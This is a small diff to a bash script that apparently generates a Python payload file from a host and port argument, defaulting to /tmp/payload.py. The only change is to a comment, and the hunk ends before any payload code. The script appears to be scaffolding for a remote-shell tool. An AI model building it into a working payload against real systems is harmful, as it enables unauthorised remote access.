@@ -4,7 +4,7 @@
 # show usage if needed
 if [[ $1 == '' || $1 == '-h' || $1 == '--help' || $1 == '-u' || $1 == '--usage' ]]; then
 	echo "usage: <HOST> <PORT> </path/to/file(default=/tmp/payload.py)>"; exit; fi
-# create output file and set file name 
+# create output file
 if [[ $3 == '' ]]; then file="/tmp/payload.py"; else file="$3"; fi; touch $file
 # write payload
 echo "#!/usr/bin/python3" >> $file
